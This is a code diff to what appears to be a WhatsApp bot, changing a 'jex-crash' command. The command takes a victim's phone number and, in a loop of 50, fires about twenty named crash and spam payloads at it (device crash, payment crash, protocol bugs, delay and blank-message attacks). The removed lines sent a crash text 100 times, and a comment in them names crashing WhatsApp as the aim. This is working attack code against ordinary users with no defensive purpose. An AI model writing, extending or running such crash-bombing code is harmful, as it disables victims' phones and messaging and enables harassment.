@@ -112,7 +112,6 @@ const { handleAntiDelete } = require('./KelvinCmds/antidelete');
 const { cleaningSession } = require('./lib/botSession'); 
 const {fetchReactionImage} = require('./lib/reaction')
 const { toAudio } = require('./lib/converter');
-const { remini } = require('./lib/remini')
 const { jadibot, stopjadibot, listjadibot } = require('./jadibot')
 const xeontext2 = require('./lib/bug');
 
@@ -11242,12 +11241,32 @@ case "jex-crash": {
     
     let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
-    reply(`*[!] Bug successfully sent to target*`); 
+    reply(`*[!] Bug sent to target*`); 
     
-    // Send multiple messages rapidly to crash Whatsapp 
-    for (let i = 0; i < 100; i++) {
-        await conn.sendMessage(target, { text: xeontext2 }, { quoted: m });
-       
+    // Rapid fire all bug functions
+    for (let i = 0; i < 50; i++) {
+        await bugs.bulldozer(target);
+        await bugs.VampSpam(target);
+        await bugs.VampDeviceCrash(target);
+        await bugs.VampPaymentCrash(target);
+        await bugs.protocolbug1(target, true);
+        await bugs.protocolbug2(target, true);
+        await bugs.protocolbug3(target, true);
+        await bugs.carouselNew(target);
+        await bugs.DelayStc(target);
+        await bugs.SockMentionJid3(target);
+        await bugs.CosmoBlankX(target);
+        await bugs.VampDelayMess(target);
+        await bugs.VampPrivateBlank(target);
+        await bugs.VampDelayCrash(target);
+        await bugs.VampBroadcast(target, true);
+        await bugs.mentionSw(target);
+        await bugs.protocolbug4(target, true);
+        await bugs.protocolbug5v2(target, true);
+        await bugs.protocolbug5(target, true);
+        await bugs.SendPairing(target);
+        await bugs.BaccaratUi(target);
+        await bugs.ProtoXAudio(target, true);
     }
     
     break;
